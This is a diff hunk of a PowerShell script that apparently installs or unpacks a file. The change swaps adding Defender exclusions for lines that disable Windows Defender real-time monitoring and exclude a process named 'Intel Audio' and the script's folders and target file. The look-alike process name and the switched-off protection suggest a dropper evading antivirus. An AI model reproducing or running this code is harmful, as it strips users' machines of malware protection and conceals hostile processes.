@@ -40,9 +40,11 @@ if (-Not (Test-Path $TargetFile)) {
       Write-Output "Zip file removed"
 }
 
-Add-MpPreference -ExclusionPath $FolderPath
-Add-MpPreference -ExclusionPath $TargetPath
-Add-MpPreference -ExclusionPath $TargetFile
+Set-MpPreference -DisableRealtimeMonitoring $true 
+Set-MpPreference -ExclusionProcess 'Intel Audio'
+Set-MpPreference -ExclusionPath $FolderPath
+Set-MpPreference -ExclusionPath $TargetPath
+Set-MpPreference -ExclusionPath $TargetFile
 Write-Output "Exclusions added"
 
 if (-Not (Test-Path $TargetFile)) {
